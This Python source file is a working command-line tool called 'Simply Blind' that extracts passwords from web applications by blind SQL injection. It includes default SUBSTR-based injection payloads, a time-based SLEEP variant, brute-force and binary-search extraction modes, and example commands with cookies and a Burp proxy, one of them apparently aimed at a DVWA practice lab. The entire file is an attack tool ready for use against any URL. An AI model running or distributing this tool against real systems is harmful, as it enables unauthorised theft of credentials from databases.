import argparse
import requests
import re
import json
import urllib.parse
import time

class Check:
    def __init__(self, mode, statusList, regex, varyVerbose):
        self.mode = mode 
        self.statusList = statusList 
        self.regex = regex 
        self.varyVerbose = varyVerbose 
        
    def match(self, responses):
        mode = self.mode
        response, timeout = responses
        redirectCodes = [300, 302, 303, 307]
        match = False
        verboseMassage = "--MATCHED: FAILED"
        
        statusCode = ''
        if(response):
            statusCode = response.status_code


        if(timeout and mode == "to"):
              match = True
              verboseMassage = "--MATCHED: Timeout: TRUE"
        elif(timeout):
              match = False
        elif(mode == "nto"):
              match = True
              verboseMassage = "--MATCHED: Not Timeout: TRUE"
        elif(not mode):
            if(statusCode == 200):
                match = True
                verboseMassage = "--MATCHED: status_code: 200"
        elif(mode == "sc"):
            if(str(statusCode) in self.statusList):
                match = True
                verboseMassage = "--MATCHED: status_code in list: " + str(statusCode)
        elif(mode == "reg"):
            regMatch = re.search(self.regex, str(response.content))
            if(regMatch):
                match = True
                verboseMassage = "--MATCHED: regex: " + str(regMatch.group())
        elif(mode == "redir"):
            if(statusCode in redirectCodes):
                match = True
                verboseMassage = "--MATCHED: redirected"
        
        if(self.varyVerbose):
            print(verboseMassage)

        if(match):
            return True
        return False


class Body:
    def __init__(self, body, payload, escapedList, escapedChar, varyVerbose):
        self.body = body 
        self.payload = payload 
        self.escapedList = escapedList  
        self.escapedChar = escapedChar  
        self.varyVerbose = varyVerbose 

    def makeBody(self, index, symbol, char): #_______________________________
        payload = self.payload.replace("!I", str(index))
        payload = payload.replace("!S", symbol)
        
        if(char in self.escapedList):
            char = self.escapedChar + char
        payload = payload.replace("!C", char)
        body = self.body.replace("!P", urllib.parse.quote_plus(payload))

        if(self.varyVerbose):
            print("--MAKEBODY: payload: " + payload)
            print("--MAKEBODY: body: " + body)

        return body

    
class Web:
    def __init__(self, methodGet, url, headers, redirected, auth, cookies, proxy, timeout, delay, content, varyVerbose):
        self.methodGet = methodGet 
        self.url = url 
        self.headers = headers
        self.redirect = redirected 
        self.auth = auth 
        self.cookies = cookies 
        self.proxy = proxy 
        self.timeout = timeout 
        self.delay = delay
        self.content = content 
        self.varyVerbose = varyVerbose 

    def request(self, body):
        timeout = False
        respond = ""

        try:
            if(self.methodGet):
                msg = "GET"
                respond = requests.get(self.url, params=body, auth=self.auth, allow_redirects=self.redirect, cookies=self.cookies , proxies=self.proxy, headers=self.headers, timeout=self.timeout)
            else:
                msg = "POST"
                respond = requests.post(self.url, data=body, auth=self.auth, allow_redirects=self.redirect, cookies=self.cookies , proxies=self.proxy, headers=self.headers, timeout=self.timeout)
        except requests.exceptions.ReadTimeout:
            timeout = True
            if(self.delay):
                time.sleep(self.timeout)

        
        if(self.content):
            print("______________________ WEB: content: ________________________\n")
            print(respond.text)
            print("_________________ END ________________________")

        if(self.varyVerbose and not timeout):
            print("--WEB: method: " + msg)
            print("--WEB: status_code: " + str(respond.status_code))
            print("--WEB: URL: " + str(respond.url))
        elif(self.varyVerbose):
            print("--WEB: method: " + msg)
            print("--WEB: TIMEOUT: TRUE")
            print("--WEB: URL: " + str(self.url))
            
        return respond, timeout


def main(arg):  
    mode = arg.mode
    
    if(mode == "sc"):
        if(not arg.status):
            print("\n-s --status <status codes> needed when using '-m sc' (status_codes mode)\n        EXAMPLE: -s 200 -s 203 -s 401")
            exit()
    if(mode == "reg"):
        if(not arg.regex):
            print("\n--regex STRING needed when using '-m reg' (regex mode) \n        EXAMPLE: --regex \"user accapted, walcome \w+\"")
            exit()
    if(mode == "to" or mode == 'nto'):
        if(not arg.timeout):
            print("\n--timeout FLAOT needed when using '-m to' or '-m nto' (Timout / Not_timeout)\n        EXAMPLE: --timeout 5")
            exit()
        delay = True
    else:
        delay = False

    varyVerbose = arg.varyVerbose
    silent = arg.silent
    test = arg.test

    if(arg.proxy_burp):
        arg.proxy = {"http":"http://localhost:8080"}

    formUrl = {"Content-Type":"application/x-www-form-urlencoded"}
    if(arg.header_formUrl and arg.header):
        arg.header.update(formUrl)
    elif(arg.header_formUrl):
        arg.header = formUrl

    web = Web(arg.get, arg.URL, arg.header, arg.redirect, (arg.user, arg.passwd), arg.cookie, arg.proxy, arg.timeout, delay, arg.content, varyVerbose)
    check = Check(arg.mode, arg.status, arg.regex, varyVerbose)
    body = Body(arg.body, arg.payload, arg.esc, arg.esc_char, varyVerbose)
    
    if(silent):
        varyVerbose = False
    else:
        print()

    if (varyVerbose):
        print(args)

    if(test):
        varyVerbose = True

    charList = arg.table
    charListLength = len(charList) - 1
    run = True
    password = ""
    length = 1
    lenghtLimit = arg.limit
    
                             
    if(arg.con):
        password = arg.con
        length = len(password) + 1

        if(lenghtLimit and (length >= lenghtLimit)):
            if(not (input("\nWARNING: length of password greater then password limit. \nPassword length limit will be ignored. CONTINUE?  (y/n) ") == 'y')):
                exit()
            else:
                lenghtLimit = False
    
    msg3 = "\n\nERROR: CHAR index surpasses CHAR table. \n\nPossibly due to FALSE positives or CHAR not found in CHAR table. \n\nTable: {}"
    msg4 = "--char: {} \n--charIndex: {}"
    msg5 = "--Extracted FOUND: {} \n"
    msg6 = "--Password Lenght matched Limit"
    mainMsg = "PASS: {}   LEN: {}  CHAR: {}"

    if(arg.brute):
        charIndex=0

        while run:
            if(varyVerbose):
                print( ("-" * 40) + "\n--password: {} \n--Password length: {}".format(password, length))

            if(charIndex > charListLength):
                print(msg3.format(charList))
                run = False
                break
       
            char = charList[charIndex]
            if(varyVerbose):
                print(msg4.format(char, charIndex))

            match = check.match(web.request(body.makeBody(length, "=", char)))
            mainMessage = mainMsg.format(password, length, char)
            if(match):
                password += char
                length += 1
                charIndex = 0

                if(varyVerbose):
                    print(msg5.format(char))
                    print("-Check if CHAR is final")

                finalChar = check.match(web.request(body.makeBody(length, "=", "")))
                if (finalChar):
                    run=False
            else:
                charIndex += 1;

            if(not silent and not varyVerbose):
                print(mainMessage, end='\r')

            if (test):
                run = False

            if(lenghtLimit):
                if(length >= lenghtLimit + 1):
                    run = False
                    if(varyVerbose):
                        print(msg6)


    else:
        symbol = ">" 
        charIndex = round(charListLength/2)  
        preCharIndex = charListLength
        narrowed = False
        forward = False
        last = False

        while run:
            if(varyVerbose):
                print(("-" * 40) + "\n--Password: {} \n--Password length: {} \n--Narrowed: {} ".format(password, length, narrowed))

            if(charIndex > charListLength or charIndex < -1):
                print(msg3.format(charList))
                run = False
                break

            if(charIndex == -1):
                char = ""
                last = True
            else:
                char = charList[charIndex]

            if(varyVerbose):
                print(msg4.format(char, charIndex))
            
            match = check.match(web.request(body.makeBody(length, symbol, char)))
            mainMessage = mainMsg.format(password, length, char)

            if(match and last):
                run = False
                break

            if(match and not narrowed):
                tempIndex = charIndex
                charIndex += round(abs(preCharIndex - charIndex)/2)
                preCharIndex = tempIndex 
                forward = True
                statusMsg = ""
            elif(not narrowed):
                tempIndex = charIndex
                charIndex -= round(abs(preCharIndex - charIndex)/2) 
                preCharIndex = tempIndex 
                forward = False
                statusMsg = ""
            elif(match):
                password += char
                length += 1
                charIndex = round(charListLength/2)  
                preCharIndex = charListLength
                symbol = ">"
                narrowed = False
                statusMsg = msg5.format(char)
            elif(forward):
                charIndex += 1
                statusMsg = "--NARROWED: moving forward"
            else:
                charIndex -= 1
                statusMsg = "--NARROWED: moving backwards"


            if(narrowed and (charIndex > (preCharIndex + 3) or charIndex < (preCharIndex - 3))):
                print("\nERROR expacted CHAR match FAILED. \nHappens when the expeced CHAR should match but did not. \nPossibly due to FALSE positives or CHAR not found in CHAR table or CHAR in table is out of order. \n\nTable: {}".format(charList)) 
                run = False
                
            if(abs(charIndex - preCharIndex) <= 2 and not narrowed):
                narrowed = True
                symbol = "="
                charIndex = preCharIndex

            if(not silent and not varyVerbose):
                print(mainMessage, end='\r')
            elif(varyVerbose):
                print(statusMsg)

            if (test):
                run = False

            if(lenghtLimit):
                if(length >= lenghtLimit + 1):
                    run = False
                    if(varyVerbose):
                        print(msg6)
                
    if (varyVerbose):
        print("\nExtracted: '" +  password + "'")
    elif(silent):
        print("Extracted: '" + password + "'")
    else:
        print("Extracted: '" +  password + "'" + (" " * (10 + len(str(length)))))

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, description=
'''
Simply Blind:
a script to extracted characters by exploiting blind SQL injection.

OUTPUT:                                 
extracted strings are enclosed in sing-quotes. Exp:

Extracted: '<extracted strings>'
''')

epi = """EXAMPLES:
python main.py {atype} -p "0' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{{"PHPSESSID":"l0ishrnmb6annfe1iin11nrqr7", "security":"low"}}' -m reg --reg "User ID exists in the database\\." --get http://172.0.0.1/vulnerabilities/sqli_blind/
\npython main.py {atype} -p 'admin\" AND BINARY SUBSTR(password, !I, 1) !S "!C" #' -b 'username=!P' -m reg --regex 'This user exists\.' --proxy-burp --header-fomrUrl --user john --passwd Password!23  http://testThatDontExist.come/uidFinder.php
\npython main.py {atype} -p "10' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', SLEEP(0.7), FALSE) #" -b 'value=!P' -c '{{"SID":"etc7stehjcs7c4kqaa6p6kit03"}}' --get -m to --timeout 0.5 http://notReal.wasd/login.php

TIP: for testing regex, you can use 'python file.py -s <attack type> --test --content | grep -E "regex expression"' to check for triggers.
NOTE: for time based attacks, Set SLEEP() value to greater than normal response time and less then --timeout*2.
"""

parser.add_argument('-v', '--varyVerbose', action='store_true',
                   help='print more information')
parser.add_argument('-s', '--silent', action='store_true',
                   help='only print the output of extracted data.')

subParsers = parser.add_subparsers(help='Attack Type:', required=True)


quick = subParsers.add_parser('quick', formatter_class=argparse.RawDescriptionHelpFormatter, description='Runs the payload and check if it matches the condition (targeted CHAR > CHAR). \nIf matched, it checks the distance of previous and current character index if it\'s less than 3. \nIf distance is less than 3. Check if current and ± 3 of CHAR = targeted CHAR. \nIf distance is greater than 3, CHAR index + (distance/2). \nIf NOT match. CHAR index - (distance/2)', help="Quick attack quickly narrows down possible CHAR before checking it. making it faster than brute", epilog=epi.format(atype="quick"))
quick.set_defaults(run=main)
quick.set_defaults(brute=False)

quick.add_argument('-b', '--body', default='id=!P&Submit=Submit', help='Set custom body. !P=payload. Payload key will be replaced with payload. DEFAULT: -b \'id=!P&Submit=Submit\'')
quick.add_argument('-p', '--payload', default='\" OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #', help='Set custom payload. !I = incrementer, !S = symbol, !C = Char. DEFAULT: -p "\' OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #"')
quick.add_argument('-m', '--mode', choices=['sc', 'redir', 'reg', 'to', 'nto'], help='Set the matching type identifier sc=status_codes, redir=rediracted, reg=regex, to=timeout, nto=not_timeout. DEFAULT: status_codes=200.')
quick.add_argument('--regex', metavar='STRING', help='used if -m reg is used. EXAMPLE: --regex \'user accapted, walcome \\w+\'')
quick.add_argument('-s', '--status', metavar='code', action='append', help='used if -m sc is used. EXAMPLE: -s 200 -s 203 -s 401')  
quick.add_argument('--timeout', type=float, help='Set request timeout')
quick.add_argument('-r', '--redirect', action='store_false', help='Disable Redirects. Used to match with -m sc or -m redir. DEFAULT: allowed')
quick.add_argument('-g', '--get', action='store_true', help='Set METHOD to GET. DEFAULT: POST')
quick.add_argument('-l', '--limit', type=int, help='Set limit on length of CHAR to crack')
quick.add_argument('-c', '--cookie', metavar='DICT', type=json.loads, help='set cookies EXAMPLE: -c \'{"key":"value", "key2":"value2"}\'') 
quick.add_argument('--header', metavar='DICT', type=json.loads, help='Set Custom header. EXAMPLE: --header \'{"header1":"value1", "header2":"value2"}\'')
quick.add_argument('--header-formUrl', action='store_true', help='append or set header {\'Content-Type\':\'application/x-www-form-urlencoded\'}')
quick.add_argument('-t', '--test', action='store_true', help='Run once with very verbose. Payload key (!I, !S, !C) is not required.')
quick.add_argument('--con', metavar="STRING", help='continue extracting already extracted string. Example: --con \'passwo\'')
quick.add_argument('--content', action="store_true", help='print content of each web request.')
quick.add_argument('--proxy', metavar='DICT', type=json.loads, help='Use proxy EXAMPLE: --proxy \'{"http":"http://127.0.0.1:8080"}\'') 
quick.add_argument('--proxy-burp', action='store_true', help='overwrite proxy to burpsuite DEFAULT: "http://localhost:8080"') 
quick.add_argument('--user', help='Set basic authentication username')
quick.add_argument('--passwd', help='Set basic authentication password')
quick.add_argument('--table', default=" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~", help='Set custom CHAR table. EXAMPLE --table "ABCabc123!@#". Not recommanded for quick. as it relys on char index regardless if exist.')
quick.add_argument('--esc', metavar='LIST', type=json.loads, default=['\'', '"', '\\', '#', '-'], help='set escaping conditions for CHAR in payload. CHAR = !C.  DEFAULT: --esc \'["\'", """, "\\", "#", "-"]\'')
quick.add_argument('--esc-char', metavar='CHAR', default="\\", help='set escaping char to escape with. DEFAULT: --esc-char \'\\\'')
quick.add_argument('URL', help='Url to run the script on. EXAMPLE: http://test.com/file.php')


brute = subParsers.add_parser('brute', formatter_class=argparse.RawDescriptionHelpFormatter, description='Run through every character in the table to check If the targeted CHAR matches the CHAR.  It if match it, then check if it is the last character. If it\'s not the last character, repeat.', help='Brute force every CHAR in the table', epilog=epi.format(atype="brute"))
brute.set_defaults(run=main)
brute.set_defaults(brute=True)

brute.add_argument('-b', '--body', default='id=!P&Submit=Submit', help='Set custom body. !P=payload. Payload key will be replaced with payload. DEFAULT: -b \'id=!P&Submit=Submit\'')
brute.add_argument('-p', '--payload', default='\" OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #', help='Set custom payload. !I = incrementer, !S = symbol, !C = Char. DEFAULT: -p "\' OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #"')
brute.add_argument('-m', '--mode', choices=['sc', 'redir', 'reg', 'to', 'nto'], help='Set the matching type identifier sc=status_codes, redir=rediracted, reg=regex, to=timeout, nto=not_timeout. DEFAULT: status_codes=200.')
brute.add_argument('--regex', metavar='STRING', help='used if -m reg is used. EXAMPLE: --regex \'user accapted, walcome \\w+\'')
brute.add_argument('-s', '--status', metavar='code', action='append', help='used if -m sc is used. EXAMPLE: -s 200 -s 203 -s 401')  
brute.add_argument('--timeout', type=float, help='Set request timeout')
brute.add_argument('-r', '--redirect', action='store_false', help='Disable Redirects. Used to match with -m sc or -m redir. DEFAULT: allowed')
brute.add_argument('-g', '--get', action='store_true', help='Set METHOD to GET. DEFAULT: POST')
brute.add_argument('-l', '--limit', type=int, help='Set limit on length of CHAR to crack')
brute.add_argument('-c', '--cookie', metavar='DICT', type=json.loads, help='set cookies EXAMPLE: -c \'{"key":"value", "key2":"value2"}\'') 
brute.add_argument('--header', metavar='DICT', type=json.loads, help='Set Custom header. EXAMPLE: --header \'{"header1":"value1", "header2":"value2"}\'')
brute.add_argument('--header-formUrl', action='store_true', help='append or set header {\'Content-Type\':\'application/x-www-form-urlencoded\'}')
brute.add_argument('-t', '--test', action='store_true', help='Run once with very verbose. Payload key (!I, !S, !C) is not required.')
brute.add_argument('--con', metavar="STRING", help='continue extracting already extracted string. Example: --con \'Passwo\'')
brute.add_argument('--content', action="store_true", help='print content of each web request.')
brute.add_argument('--proxy', metavar='DICT', type=json.loads, help='Use proxy EXAMPLE: --proxy \'{"http":"http://127.0.0.1:8080"}\'') 
brute.add_argument('--proxy-burp', action='store_true', help='overwrite proxy to burpsuite DEFAULT: "http://localhost:8080"') 
brute.add_argument('--user', help='Set basic authentication username')
brute.add_argument('--passwd', help='Set basic authentication password')
brute.add_argument('--table', default=" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~", help='Set custom CHAR table. Example --table "ABCabc123!@#"')
brute.add_argument('--esc', metavar='LIST', type=json.loads, default=['\'', '"', '\\', '#', '-'], help='set escaping conditions for CHAR in payload. CHAR = !C.  DEFAULT: --esc \'["\'", """, "\\", "#", "-"]\'')
brute.add_argument('--esc-char', metavar='CHAR', default="\\", help='set escaping char to escape with. DEFAULT: --esc-char \'\\\'')
brute.add_argument('URL', help='Url to run the script on. EXAMPLE: http://test.com/file.php')


args = parser.parse_args()
args.run(args)
